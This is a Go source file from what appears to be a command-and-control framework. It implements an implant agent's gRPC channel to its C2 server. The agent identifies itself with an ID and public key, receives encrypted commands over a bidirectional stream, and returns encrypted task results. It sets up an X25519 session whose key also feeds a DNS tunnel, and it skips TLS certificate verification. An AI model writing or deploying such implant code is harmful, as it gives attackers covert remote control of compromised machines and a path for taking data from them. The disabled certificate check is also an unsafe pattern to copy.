package agent

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"sync"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"
	"google.golang.org/grpc/metadata"

	"github.com/ruby570bocadito/vesper/internal/crypto"
	agentv1 "github.com/ruby570bocadito/vesper/pkg/proto/gen/agent"
	"github.com/ruby570bocadito/vesper/pkg/shared/config"
	"github.com/ruby570bocadito/vesper/pkg/shared/logger"
)

// gRPCConnector implements the Connector interface using gRPC + TLS.
type gRPCConnector struct {
	cfg     *config.Config
	log     *logger.Logger
	keypair *crypto.KeyPair
	session *crypto.Session
	conn    *grpc.ClientConn
	client  agentv1.AgentServiceClient
	stream  agentv1.AgentService_CommandStreamClient
	mu      sync.Mutex
	agentID string
}

// NewgRPCConnector creates a new gRPC-based C2 connector.
func NewgRPCConnector(cfg *config.Config, log *logger.Logger, kp *crypto.KeyPair, id string) *gRPCConnector {
	return &gRPCConnector{
		cfg:     cfg,
		log:     log,
		keypair: kp,
		agentID: id,
	}
}

// Connect establishes a gRPC connection to the C2 server and opens the
// bidirectional command stream.
func (c *gRPCConnector) Connect(ctx context.Context, serverAddr string) error {
	var opts []grpc.DialOption

	if c.cfg.Server.EnableTLS {
		creds := credentials.NewTLS(&tls.Config{
			InsecureSkipVerify: true,
		})
		opts = append(opts, grpc.WithTransportCredentials(creds))
	} else {
		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}

	// Add agent ID as metadata for server-side identification
	opts = append(opts, grpc.WithUnaryInterceptor(func(
		ctx context.Context,
		method string,
		req, reply interface{},
		cc *grpc.ClientConn,
		invoker grpc.UnaryInvoker,
		opts ...grpc.CallOption,
	) error {
		ctx = metadata.AppendToOutgoingContext(ctx,
			"agent-id", c.agentID,
			"public-key", fmt.Sprintf("%x", c.keypair.PublicKey[:]),
		)
		return invoker(ctx, method, req, reply, cc, opts...)
	}))

	opts = append(opts,
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:    10 * time.Second,
			Timeout: 5 * time.Second,
		}),
	)

	conn, err := grpc.DialContext(ctx, serverAddr, opts...) //nolint:staticcheck // supported throughout gRPC 1.x; NewClient has different dial semantics
	if err != nil {
		return fmt.Errorf("dialing C2 server at %s: %w", serverAddr, err)
	}

	c.conn = conn
	c.client = agentv1.NewAgentServiceClient(conn)

	// Open bidirectional command stream
	stream, err := c.client.CommandStream(ctx)
	if err != nil {
		return fmt.Errorf("opening command stream: %w", err)
	}
	c.stream = stream

	c.log.Infof("connected to C2 server at %s via gRPC", serverAddr)
	return nil
}

// Send sends an encrypted message to the C2 server via the gRPC stream.
func (c *gRPCConnector) Send(data []byte) error {
	c.mu.Lock()
	stream := c.stream
	c.mu.Unlock()

	if stream == nil {
		return fmt.Errorf("not connected")
	}

	var encrypted []byte
	if c.session != nil {
		var err error
		encrypted, err = c.session.Encrypt(data)
		if err != nil {
			return fmt.Errorf("encrypting: %w", err)
		}
	} else {
		encrypted = data
	}

	msg := &agentv1.AgentMessage{
		SessionId: c.agentID,
		Message: &agentv1.AgentMessage_TaskResult{
			TaskResult: &agentv1.TaskResult{
				CommandId: c.agentID,
				Success:   true,
				Output:    string(encrypted),
			},
		},
	}

	if err := stream.Send(msg); err != nil {
		return fmt.Errorf("sending via gRPC stream: %w", err)
	}

	c.log.Debugf("sent %d bytes to C2 via gRPC stream", len(encrypted))
	return nil
}

// Recv receives a message from the C2 server via the gRPC stream.
func (c *gRPCConnector) Recv() ([]byte, error) {
	c.mu.Lock()
	stream := c.stream
	c.mu.Unlock()

	if stream == nil {
		return nil, fmt.Errorf("not connected")
	}

	msg, err := stream.Recv()
	if err != nil {
		if err == io.EOF {
			return nil, nil
		}
		return nil, fmt.Errorf("receiving from gRPC stream: %w", err)
	}

	var decrypted []byte
	switch m := msg.Message.(type) {
	case *agentv1.ServerMessage_Command:
		payload := m.Command.Payload
		if c.session != nil {
			decrypted, err = c.session.Decrypt([]byte(payload))
			if err != nil {
				return nil, fmt.Errorf("decrypting: %w", err)
			}
		} else {
			decrypted = []byte(payload)
		}
	case *agentv1.ServerMessage_Heartbeat:
		return nil, nil // heartbeat, no data
	default:
		return nil, nil
	}

	return decrypted, nil
}

// Close closes the gRPC connection.
func (c *gRPCConnector) Close() error {
	if c.conn != nil {
		return c.conn.Close()
	}
	return nil
}

// EstablishSession performs X25519 key exchange with the C2 server.
func (c *gRPCConnector) EstablishSession(serverPublicKey [32]byte) error {
	session, err := crypto.NewSession(c.keypair, serverPublicKey)
	if err != nil {
		return fmt.Errorf("establishing crypto session: %w", err)
	}
	c.session = session
	SetDNSTunnelKey(session.SharedKey())
	c.log.Infof("encrypted session established (X25519 + XChaCha20-Poly1305)")
	return nil
}

// Connection returns the underlying gRPC connection.
func (c *gRPCConnector) Connection() *grpc.ClientConn {
	return c.conn
}
